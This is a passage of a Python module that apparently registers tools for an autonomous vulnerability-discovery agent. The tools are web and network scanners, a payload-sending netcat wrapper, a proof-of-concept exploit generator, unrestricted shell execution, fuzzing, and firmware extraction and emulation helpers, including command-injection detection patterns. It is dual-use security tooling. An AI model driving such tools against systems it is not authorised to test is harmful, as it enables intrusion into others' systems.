"""Vulnerability discovery agent tool registrations.

Includes all CTF tools plus additional vulnerability scanning tools
(nuclei, ZAP, etc.) when available.
"""

from __future__ import annotations

import io
from pathlib import Path
import re
import shutil
import struct
import subprocess
import time

from typing import Any as _Any

from vulnagent.firmware.emulation import EmulationPreparer, EmulationRunner, build_systemmode_package, build_systemmode_plan
from vulnagent.firmware.extract import FirmwareExtractor
from vulnagent.firmware.inventory import build_service_inventory
from vulnagent.firmware.workspace import RuntimeWorkspaceManager
from vulnagent.paths import default_run_root
from vulnagent.runtime.context import current_runtime_run_id
from vulnagent.tools.ssh_executor import RemoteConfig, configure_remote
from vulnagent.tools.registry import ToolDefinition, ToolRegistry
from vulnagent.utils.settings import SettingsManager

from vulnagent.firmware.binary_audit import audit_rootfs, report_to_json as _audit_report_json

# ── Constraint engine (module-level, set by orchestrator) ──
_constraint_engine: _Any = None

# ── Sandbox container (module-level, set by orchestrator) ──
_sandbox: _Any = None


def set_constraint_engine(engine: _Any) -> None:
    """Set the global constraint engine for all tool executions."""
    global _constraint_engine
    _constraint_engine = engine


def set_sandbox(sandbox: _Any) -> None:
    """Set the global sandbox container for isolated tool execution."""
    global _sandbox
    _sandbox = sandbox


# ── Parser integration: post-process security tool outputs ──

from vulnagent.tools.parsers.nmap import parse_nmap_output
from vulnagent.tools.parsers.gobuster import parse_gobuster_output
from vulnagent.tools.parsers.nikto import parse_nikto_output

_PARSER_MAP: dict[str, _Any] = {
    "nmap_scan": parse_nmap_output,
    "gobuster_scan": parse_gobuster_output,
    "nikto_scan": parse_nikto_output,
}


def _execute_with_parser(tool_name: str, cmd: list[str]) -> "ToolResult":
    """Execute a command and post-process stdout through its parser."""
    import json as _json
    result = _execute(cmd)
    parser = _PARSER_MAP.get(tool_name)
    if parser is not None and result.return_code == 0 and result.stdout:
        try:
            structured = parser(result.stdout)
            parsed_json = _json.dumps(structured, indent=2, ensure_ascii=False)
            result.stdout = f"--- STRUCTURED OUTPUT ---\n{parsed_json}\n--- RAW OUTPUT ---\n{result.stdout}"
        except Exception:
            pass
    return result


def register_vuln_tools(registry: ToolRegistry) -> ToolRegistry:
    """Register vulnerability discovery tools.

    Includes all CTF tools plus vulnerability-specific scanners.
    Returns the registry for method chaining.
    """
    tools: list[ToolDefinition] = [
        # ── Web Application Scanning ─────────────────────────────
        ToolDefinition(
            name="nuclei_scan",
            description="Template-based vulnerability scanner",
            parameters={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL or IP"},
                    "templates": {"type": "string", "description": "Template tags, e.g. 'cve,exposure'", "default": "cve"},
                    "severity": {"type": "string", "description": "Minimum severity: info,low,medium,high,critical", "default": "medium"},
                },
                "required": ["target"],
            },
            executor=lambda p: _execute([
                "nuclei",
                "-u", p["target"],
                "-t", p.get("templates", "cve"),
                "-severity", p.get("severity", "medium"),
                "-silent",
            ]),
            category="web",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="whatweb_scan",
            description="Identify web technologies used by a target",
            parameters={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL"},
                },
                "required": ["target"],
            },
            executor=lambda p: _execute(["whatweb", p["target"]]),
            category="web",
            requires_network=True,
            risk_level="safe",
        ),
        ToolDefinition(
            name="wpscan",
            description="WordPress vulnerability scanner",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "WordPress site URL"},
                    "enumerate": {"type": "string", "description": "Components to enumerate: p,u,t (plugins,users,themes)", "default": "p,u"},
                },
                "required": ["url"],
            },
            executor=lambda p: _execute([
                "wpscan",
                "--url", p["url"],
                "--enumerate", p.get("enumerate", "p,u"),
                "--no-banner",
            ]),
            category="web",
            requires_network=True,
            risk_level="moderate",
        ),

        # ── Network and Infrastructure ───────────────────────────
        ToolDefinition(
            name="sslscan",
            description="Scan SSL/TLS configuration for vulnerabilities",
            parameters={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target host:port"},
                },
                "required": ["target"],
            },
            executor=lambda p: _execute(["sslscan", p["target"]]),
            category="recon",
            requires_network=True,
            risk_level="safe",
        ),
        ToolDefinition(
            name="searchsploit",
            description="Search ExploitDB for known exploits",
            parameters={
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "Search query (software name, version, CVE)"},
                },
                "required": ["query"],
            },
            executor=lambda p: _execute(["searchsploit", p["query"]]),
            category="recon",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="netcat_connect",
            description="Open a TCP connection, optionally send a payload, and capture the response",
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "Target host or IP"},
                    "port": {"type": "integer", "description": "Target TCP port"},
                    "payload": {"type": "string", "description": "Data to send after connecting", "default": ""},
                    "timeout": {"type": "integer", "description": "Socket timeout in seconds", "default": 5},
                    "read_bytes": {"type": "integer", "description": "Maximum bytes to read", "default": 4096},
                },
                "required": ["host", "port"],
            },
            executor=lambda p: _netcat_connect(p),
            category="exploit",
            requires_network=True,
            risk_level="moderate",
        ),

        # ── Reporting ────────────────────────────────────────────
        ToolDefinition(
            name="whatweb_report",
            description="Generate technology stack report for a target",
            parameters={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL"},
                },
                "required": ["target"],
            },
            executor=lambda p: _execute(["whatweb", "--log-json=-", p["target"]]),
            category="recon",
            requires_network=True,
            risk_level="safe",
        ),

        # ── PoC Generation ──────────────────────────────────────────
        ToolDefinition(
            name="generate_poc",
            description=(
                "Generate a standalone, self-contained proof-of-concept Python "
                "script for a confirmed or validated firmware vulnerability. "
                "The script is written to the runtime workspace and is ready to "
                "run against the target. Supports templates: command_injection, "
                "hardcoded_credentials, auth_bypass, config_import, and generic."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "vuln_type": {
                        "type": "string",
                        "description": (
                            "Vulnerability archetype: command_injection, "
                            "hardcoded_credentials, auth_bypass, config_import, "
                            "or generic"
                        ),
                    },
                    "target_endpoint": {
                        "type": "string",
                        "description": "The reachable target endpoint URL (e.g. http://127.0.0.1:8080/cgi-bin/upload.cgi)",
                    },
                    "vuln_title": {
                        "type": "string",
                        "description": "Short title for the vulnerability being demonstrated",
                    },
                    "payload": {
                        "type": "string",
                        "description": "The specific payload, credentials, or parameters to use",
                        "default": "",
                    },
                    "extra_params": {
                        "type": "string",
                        "description": "Additional JSON-encoded parameters (method, headers, form fields, etc.)",
                        "default": "{}",
                    },
                },
                "required": ["vuln_type", "target_endpoint", "vuln_title"],
            },
            executor=lambda p: _generate_poc(
                str(p["vuln_type"]),
                str(p["target_endpoint"]),
                str(p["vuln_title"]),
                str(p.get("payload", "")),
                str(p.get("extra_params", "{}")),
            ),
            category="exploit",
            requires_network=False,
            risk_level="safe",
        ),
    ]

    registry.register_many(tools)
    return registry


def register_all_vuln_tools(registry: ToolRegistry) -> ToolRegistry:
    """Register all vulnerability discovery tools.

    Includes basic recon tools plus vulnerability-specific scanners.
    Returns the registry for method chaining.
    """
    _register_recon_tools(registry)
    register_vuln_tools(registry)
    return registry


def _register_recon_tools(registry: ToolRegistry) -> None:
    """Register basic recon and generic tools needed by vuln agents."""
    tools: list[ToolDefinition] = [
        ToolDefinition(
            name="file_identify",
            description="Identify file type and container format",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the local artifact"},
                },
                "required": ["path"],
            },
            executor=lambda p: _file_identify(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="readelf_headers",
            description="Inspect ELF headers for architecture and linking clues",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "ELF binary path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _readelf_headers(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="strings_extract",
            description="Extract printable strings from a local binary or blob",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Artifact path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _strings_extract(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="binwalk_scan",
            description="Scan firmware images for embedded filesystems and payloads",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _binwalk_scan(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_extract_summary",
            description="Extract a concise summary from embedded SquashFS firmware filesystems using a pure-Python fallback",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_extract_summary(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_read_path",
            description="Read a specific file inside an embedded SquashFS filesystem as text or printable strings",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                    "inner_path": {"type": "string", "description": "Absolute path inside the firmware filesystem"},
                    "mode": {"type": "string", "description": "Read mode: auto, text, or strings", "default": "auto"},
                    "max_bytes": {"type": "integer", "description": "Maximum bytes to read", "default": 8192},
                },
                "required": ["path", "inner_path"],
            },
            executor=lambda p: _firmware_read_path(
                p["path"],
                p["inner_path"],
                str(p.get("mode", "auto")),
                int(p.get("max_bytes", 8192)),
            ),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_search",
            description="Search extracted SquashFS files for a handler name, route, script, or other marker",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                    "pattern": {"type": "string", "description": "Case-insensitive substring to search for"},
                    "mode": {"type": "string", "description": "Search mode: auto, text, or strings", "default": "auto"},
                    "max_results": {"type": "integer", "description": "Maximum matches to return", "default": 25},
                    "max_bytes": {"type": "integer", "description": "Maximum bytes to inspect per file", "default": 131072},
                },
                "required": ["path", "pattern"],
            },
            executor=lambda p: _firmware_search(
                p["path"],
                p["pattern"],
                str(p.get("mode", "auto")),
                int(p.get("max_results", 25)),
                int(p.get("max_bytes", 131072)),
            ),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_web_surface_map",
            description="Enumerate web-facing routes, CGI endpoints, and GoAhead handler markers from an extracted firmware filesystem",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                    "max_results": {"type": "integer", "description": "Maximum map lines to return", "default": 200},
                    "max_bytes": {"type": "integer", "description": "Maximum bytes to inspect per file", "default": 131072},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_web_surface_map(
                p["path"],
                int(p.get("max_results", 200)),
                int(p.get("max_bytes", 131072)),
            ),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_extract_rootfs",
            description="Extract the first usable firmware rootfs into an external runtime workspace",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_extract_rootfs(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_runtime_manifest",
            description="Build a normalized runtime manifest for a firmware artifact",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_runtime_manifest(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_service_inventory",
            description="Rank likely service binaries inside a normalized firmware rootfs",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_service_inventory(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_emulation_prepare",
            description="Prepare a user-mode emulation workspace and select the matching QEMU binary",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_emulation_prepare(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_emulation_launch_user",
            description="Attempt to launch the highest-priority firmware service candidate under user-mode emulation",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_emulation_launch_user(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="firmware_emulation_probe",
            description="Probe a local emulated service endpoint using a protocol-aware check",
            parameters={
                "type": "object",
                "properties": {
                    "port": {"type": "integer", "description": "Port to probe", "default": 8080},
                    "service_type": {
                        "type": "string",
                        "description": "Protocol or service hint, such as http, telnet, ssh, or upnp",
                        "default": "http",
                    },
                },
            },
            executor=lambda p: _firmware_emulation_probe(
                int(p.get("port", 8080)),
                str(p.get("service_type", "http")),
            ),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="firmware_emulation_launch_system",
            description="Generate a thin system-mode fallback package for a firmware artifact",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Firmware image path"},
                },
                "required": ["path"],
            },
            executor=lambda p: _firmware_emulation_launch_system(p["path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        # ── Agent-autonomous ELF surface scan + QEMU exec ──
        ToolDefinition(
            name="elf_surface_scan",
            description=(
                "Scan a directory of ELF binaries for command injection signals. "
                "Detects system()/popen()/execve() imports AND shell command "
                "patterns (cat %s, rm -f %s, curl_cmd=%s, confd_cmd, etc.) "
                "across ARM, MIPS, and x86 ELF binaries. "
                "Use this FIRST on any CGI directory or firmware extracted rootfs. "
                "Returns CRITICAL/HIGH/MEDIUM findings with priority targets."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "dir_path": {"type": "string", "description": "Path to directory containing ELF binaries (e.g. /firmware/www/cgi-bin)"},
                },
                "required": ["dir_path"],
            },
            executor=lambda p: _elf_surface_scan(p["dir_path"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="qemu_elf_exec",
            description=(
                "Execute an ELF binary under QEMU user-mode emulation. "
                "Auto-detects architecture (ARM/MIPS/x86). Supports custom "
                "environment variables, stdin data, and strace for syscall "
                "tracing. Use this to dynamically test CGI binaries for "
                "command injection — attach strace to observe execve/popen."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "elf_path": {"type": "string", "description": "Path to the ELF binary"},
                    "rootfs_path": {"type": "string", "description": "Root filesystem path for shared libraries (QEMU -L)", "default": ""},
                    "env_vars": {"type": "string", "description": "Comma-separated env vars (QUERY_STRING=...,REQUEST_METHOD=POST)", "default": ""},
                    "stdin_data": {"type": "string", "description": "Data to pipe to binary stdin", "default": ""},
                    "strace": {"type": "boolean", "description": "Enable syscall tracing", "default": True},
                    "timeout_s": {"type": "integer", "description": "Execution timeout in seconds", "default": 10},
                },
                "required": ["elf_path"],
            },
            executor=lambda p: _qemu_elf_exec(
                p["elf_path"], p.get("rootfs_path", ""),
                p.get("env_vars", ""), p.get("stdin_data", ""),
                p.get("strace", True), p.get("timeout_s", 10),
            ),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="ubi_extract",
            description=(
                "Extract UBIFS volumes from a UBI image (Cisco RV340, "
                "OpenWrt NAND firmware). Parses UBI EC/VID headers (big-endian) "
                "and writes volume_N.ubifs files. Use after binwalk extracts "
                "the rootfs UBI image from uImage→gzip→tar chain."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "ubi_path": {"type": "string", "description": "Path to the .ubi image file"},
                    "output_dir": {"type": "string", "description": "Directory to write volume_N.ubifs files"},
                },
                "required": ["ubi_path", "output_dir"],
            },
            executor=lambda p: _ubi_extract_files(p["ubi_path"], p["output_dir"]),
            category="artifact",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="nmap_scan",
            description="Network port scan using nmap",
            parameters={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target IP or hostname"},
                    "flags": {"type": "string", "description": "Additional nmap flags", "default": "-sV -sC"},
                },
                "required": ["target"],
            },
            executor=lambda p: _execute_with_parser("nmap_scan", ["nmap", p.get("flags", "-sV -sC"), p["target"]]),
            category="recon",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="gobuster_scan",
            description="Directory/file enumeration using gobuster",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                    "wordlist": {"type": "string", "description": "Wordlist path", "default": "common"},
                },
                "required": ["url"],
            },
            executor=lambda p: _execute_with_parser("gobuster_scan", ["gobuster", "dir", "-u", p["url"], "-w", p.get("wordlist", "common")]),
            category="recon",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="nikto_scan",
            description="Web server vulnerability scanner",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                },
                "required": ["url"],
            },
            executor=lambda p: _execute_with_parser("nikto_scan", ["nikto", "-h", p["url"]]),
            category="web",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="curl_request",
            description="Make HTTP requests using curl",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                    "method": {"type": "string", "description": "HTTP method", "default": "GET"},
                    "headers": {"type": "string", "description": "Additional headers (-H)", "default": ""},
                    "data": {"type": "string", "description": "POST data", "default": ""},
                },
                "required": ["url"],
            },
            executor=lambda p: _execute(_curl_cmd(p)),
            category="web",
            requires_network=True,
            risk_level="safe",
        ),
        ToolDefinition(
            name="python_exec",
            description="Execute Python code for data analysis and scripting",
            parameters={
                "type": "object",
                "properties": {
                    "code": {"type": "string", "description": "Python code to execute"},
                },
                "required": ["code"],
            },
            executor=lambda p: _execute_python(p["code"]),
            category="util",
            requires_network=False,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="shell_exec",
            description="Execute a shell command",
            parameters={
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Shell command to execute"},
                },
                "required": ["command"],
            },
            executor=lambda p: _execute(p["command"]),
            category="util",
            requires_network=False,
            risk_level="dangerous",
        ),
        # ── Browser-based web verification tools ──
        ToolDefinition(
            name="browser_navigate",
            description="Navigate browser to a URL and capture page content (title, URL, visible text). Requires --serve or Playwright MCP",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full URL to navigate to"},
                    "cookies": {"type": "string", "description": "Optional cookie string", "default": ""},
                    "wait_seconds": {"type": "integer", "description": "Wait after page load (seconds)", "default": 3},
                },
                "required": ["url"],
            },
            executor=lambda p: _browser_navigate(p["url"], p.get("cookies", ""), p.get("wait_seconds", 3)),
            category="web",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="browser_extract",
            description="Extract content from the current browser page (all text, forms, links, or interactive elements)",
            parameters={
                "type": "object",
                "properties": {
                    "what": {"type": "string", "description": "What to extract: all, forms, links, interactive, headers", "default": "all"},
                },
                "required": [],
            },
            executor=lambda p: _browser_extract(p.get("what", "all")),
            category="web",
            requires_network=True,
            risk_level="safe",
        ),
        ToolDefinition(
            name="browser_click",
            description="Click an element on the current browser page by CSS selector or visible text",
            parameters={
                "type": "object",
                "properties": {
                    "selector_or_text": {"type": "string", "description": "CSS selector or visible text to click"},
                },
                "required": ["selector_or_text"],
            },
            executor=lambda p: _browser_click(p["selector_or_text"]),
            category="web",
            requires_network=True,
            risk_level="moderate",
        ),
        ToolDefinition(
            name="file_read",
            description="Read a file from the filesystem",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "File path to read"},
                },
                "required": ["path"],
            },
            executor=lambda p: _read_file(p["path"]),
            category="util",
            requires_network=False,
            risk_level="safe",
        ),
        # ── Pure-Python binary analysis tools ──
        ToolDefinition(
            name="python_disassemble",
            description="Disassemble a binary or ELF using pure Python (no external deps). Returns hex dump and basic file info",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the binary file"},
                },
                "required": ["path"],
            },
            executor=lambda p: _python_disassemble(p["path"]),
            category="binary",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="python_checksec",
            description="Check binary security features (ASLR/NX/Canary/PIE/RELRO) using pure Python",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the ELF binary"},
                },
                "required": ["path"],
            },
            executor=lambda p: _python_checksec(p["path"]),
            category="binary",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="python_strings",
            description="Extract printable ASCII strings from a binary file (pure Python fallback)",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the binary file"},
                    "min_length": {"type": "integer", "description": "Minimum string length", "default": 4},
                },
                "required": ["path"],
            },
            executor=lambda p: _python_strings_extract(p["path"], p.get("min_length", 4)),
            category="binary",
            requires_network=False,
            risk_level="safe",
        ),
        ToolDefinition(
            name="python_http_scan",
            description="Basic HTTP GET scan with header analysis (pure Python, no curl needed)",
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                },
                "required": ["url"],
            },
            executor=lambda p: _python_http_scan(p["url"]),
            category="web",
            requires_network=True,
            risk_level="safe",
        ),
        ToolDefinition(
            name="fuzz_target",
            description="Fuzz a discovered service endpoint (HTTP/TCP) using AFL++ or Boofuzz. Reports crashes found",
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "Target host (default 127.0.0.1)", "default": "127.0.0.1"},
                    "port": {"type": "integer", "description": "Target port"},
                    "protocol": {"type": "string", "description": "Protocol: tcp/http", "default": "http"},
                    "timeout_seconds": {"type": "integer", "description": "Fuzzing duration in seconds", "default": 60},
                },
                "required": ["port"],
            },
            executor=lambda p: _fuzz_target(p.get("host", "127.0.0.1"), p["port"], p.get("protocol", "http"), p.get("timeout_seconds", 60)),
            category="exploit",
            requires_network=True,
            risk_level="moderate",
        ),
    ]
    registry.register_many(tools)


def _curl_cmd(params: dict) -> list[str]:
    cmd = ["curl", "-s", "-L"]
    if params.get("method", "GET") != "GET":
        cmd.extend(["-X", params["method"]])
    for h in str(params.get("headers", "")).split(";"):
        h = h.strip()
        if h:
            cmd.extend(["-H", h])
    if params.get("data"):
        cmd.extend(["-d", params["data"]])
    cmd.append(params["url"])
    return cmd


def _command_available(name: str) -> bool:
    return shutil.which(name) is not None


def _file_identify(path: str) -> "ToolResult":
    if _command_available("file"):
        return _execute(["file", path])

    start = time.perf_counter()
    try:
        blob = Path(path).read_bytes()
        size = len(blob)
        lines = [f"{path}: size={size} bytes"]
        elf = _parse_elf_header(blob)
        if elf:
            lines.append(
                f"ELF {elf['class']} {elf['endianness']} {elf['type']} for {elf['machine']}"
            )
        else:
            signature_hits = _scan_firmware_signatures(blob, max_hits=6)
            if signature_hits:
                lines.append("embedded signatures:")
                for offset, description in signature_hits:
                    lines.append(f"  - 0x{offset:08x}: {description}")
            else:
                lines.append(_describe_blob(blob))
        return _tool_result("file_identify", path, "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("file_identify", path, "", stderr=str(exc), return_code=-1, start=start)


def _readelf_headers(path: str) -> "ToolResult":
    if _command_available("readelf"):
        return _execute(["readelf", "-h", path])

    start = time.perf_counter()
    try:
        blob = Path(path).read_bytes()
        elf = _parse_elf_header(blob)
        if not elf:
            return _tool_result(
                "readelf_headers",
                path,
                "",
                stderr=f"Not an ELF file: {path}",
                return_code=-1,
                start=start,
            )
        lines = [
            "ELF Header:",
            f"  Class:                             {elf['class']}",
            f"  Data:                              {elf['endianness']}",
            f"  Type:                              {elf['type']}",
            f"  Machine:                           {elf['machine']}",
            f"  Entry point address:               0x{elf['entry']:x}",
            f"  Start of program headers:          {elf['program_header_offset']} (bytes into file)",
            f"  Start of section headers:          {elf['section_header_offset']} (bytes into file)",
        ]
        return _tool_result("readelf_headers", path, "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("readelf_headers", path, "", stderr=str(exc), return_code=-1, start=start)


def _strings_extract(path: str) -> "ToolResult":
    if _command_available("strings"):
        return _execute(["strings", "-a", path])

    start = time.perf_counter()
    try:
        blob = Path(path).read_bytes()
        matches = re.findall(rb"[\x20-\x7e]{4,}", blob)
        unique = list(dict.fromkeys(match.decode("ascii", errors="ignore") for match in matches))
        text = "\n".join(unique[:4000])
        return _tool_result("strings_extract", path, text, start=start)
    except Exception as exc:
        return _tool_result("strings_extract", path, "", stderr=str(exc), return_code=-1, start=start)


def _binwalk_scan(path: str) -> "ToolResult":
    if _command_available("binwalk"):
        return _execute(["binwalk", path])

    start = time.perf_counter()
    try:
        blob = Path(path).read_bytes()
        hits = _scan_firmware_signatures(blob, max_hits=64)
        if hits:
            lines = [
                "DECIMAL       HEXADECIMAL     DESCRIPTION",
            ]
            for offset, description in hits:
                lines.append(f"{offset:<13d}  0x{offset:08x}     {description}")
        else:
            lines = ["No known firmware signatures found."]
        return _tool_result("binwalk_scan", path, "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("binwalk_scan", path, "", stderr=str(exc), return_code=-1, start=start)


_FW_DIR_AS_DIRECTORY_SENTINEL = object()  # internal marker

def _firmware_extract_summary(path: str) -> "ToolResult":
    start = time.perf_counter()
    # Directory target → list the filesystem tree directly
    p = Path(path)
    if p.is_dir():
        try:
            lines = [f"Directory rootfs: {p}"]
            for top in sorted(p.iterdir()):
                lines.append(f"  {top.name}{'/' if top.is_dir() else ''}")
                if top.is_dir():
                    subs = sorted(top.iterdir())[:20]
                    for s in subs:
                        lines.append(f"    {s.name}{'/' if s.is_dir() else ''}")
                    if len(list(top.iterdir())) > 20:
                        lines.append(f"    ... ({len(list(top.iterdir()))} entries total)")
            return _tool_result("firmware_extract_summary", path, "\n".join(lines), start=start)
        except Exception as exc:
            return _tool_result("firmware_extract_summary", path, "", stderr=str(exc), return_code=-1, start=start)
    try:
        fs, offset, stderr = _load_first_squashfs(path)
        if fs is None or offset is None:
            stdout = "No SquashFS filesystem markers found for extraction."
            if stderr:
                stdout = "SquashFS markers detected but no extractable filesystem summary was produced."
            return _tool_result("firmware_extract_summary", path, stdout, stderr=stderr, start=start)
        summary = _summarize_squashfs_filesystem(fs, offset)
        if summary:
            return _tool_result("firmware_extract_summary", path, summary, start=start)
        stdout = "SquashFS markers detected but no extractable filesystem summary was produced."
        return _tool_result("firmware_extract_summary", path, stdout, stderr=stderr, start=start)
    except Exception as exc:
        return _tool_result("firmware_extract_summary", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_read_path(path: str, inner_path: str, mode: str = "auto", max_bytes: int = 8192) -> "ToolResult":
    start = time.perf_counter()
    # Directory target → read directly from filesystem
    p = Path(path)
    if p.is_dir():
        try:
            target = p / inner_path.lstrip("/")
            if not target.exists():
                return _tool_result("firmware_read_path", [path, inner_path],
                                    f"Path not found: {inner_path}", return_code=-1, start=start)
            if target.is_dir():
                listing = "\n".join(f"  {e.name}" for e in sorted(target.iterdir())[:50])
                return _tool_result("firmware_read_path", [path, inner_path],
                                    f"Directory {inner_path}:\n{listing}", start=start)
            content = target.read_bytes()[:max_bytes]
            if mode == "text" or mode == "auto":
                try:
                    text = content.decode("utf-8")
                except UnicodeDecodeError:
                    text = content.decode("latin-1", errors="replace")
                return _tool_result("firmware_read_path", [path, inner_path], text[:max_bytes], start=start)
            return _tool_result("firmware_read_path", [path, inner_path],
                                content.hex()[:max_bytes], start=start)
        except Exception as exc:
            return _tool_result("firmware_read_path", [path, inner_path], "",
                                stderr=str(exc), return_code=-1, start=start)
    try:
        fs, _offset, stderr = _load_first_squashfs(path)
        if fs is None:
            stdout = "Unable to load an embedded SquashFS filesystem from the provided artifact."
            return _tool_result("firmware_read_path", [path, inner_path], stdout, stderr=stderr, return_code=-1, start=start)

        normalized_path = inner_path if inner_path.startswith("/") else f"/{inner_path}"
        normalized_mode = (mode or "auto").strip().lower()

        # If path is a directory, list contents instead of returning empty
        node = _squashfs_get(fs, normalized_path)
        if node is not None and getattr(node, "is_dir", lambda: False)():
                entries = []
                try:
                    for entry in sorted(node.listdir()):
                        child = f"{normalized_path.rstrip('/')}/{entry}"
                        child_node = fs.get(child)
                        etype = "dir/" if getattr(child_node, "is_dir", lambda: False)() else ""
                        entries.append(f"  {entry}{etype}")
                except Exception:
                    entries = ["  (unable to list directory)"]
                listing = f"[DIRECTORY] {normalized_path}:\n" + "\n".join(entries[:60])
                return _tool_result("firmware_read_path", [path, inner_path, "dir"], listing, start=start)

        if normalized_mode == "strings":
            strings = _read_squashfs_strings(fs, normalized_path, max_bytes=max(65536, max_bytes))
            stdout = "\n".join(strings[:400])
        elif normalized_mode == "auto":
            blob = _read_squashfs_bytes(fs, normalized_path, max_bytes=max(65536, max_bytes))
            if _looks_binary_blob(blob):
                strings = _extract_printable_strings(blob, limit=400)
                stdout = "[auto-mode:strings]\n" + "\n".join(strings)
            else:
                stdout = _decode_blob_text(blob)
        else:
            stdout = _read_squashfs_text(fs, normalized_path, max_bytes=max_bytes)

        if not stdout:
            stdout = f"No readable content returned for {normalized_path} (mode={normalized_mode})."
        return _tool_result("firmware_read_path", [path, inner_path, normalized_mode], stdout, start=start)
    except Exception as exc:
        return _tool_result("firmware_read_path", [path, inner_path, mode], "", stderr=str(exc), return_code=-1, start=start)


def _firmware_search(
    path: str,
    pattern: str,
    mode: str = "auto",
    max_results: int = 25,
    max_bytes: int = 131072,
) -> "ToolResult":
    start = time.perf_counter()
    p = Path(path)
    # Directory target → filesystem grep
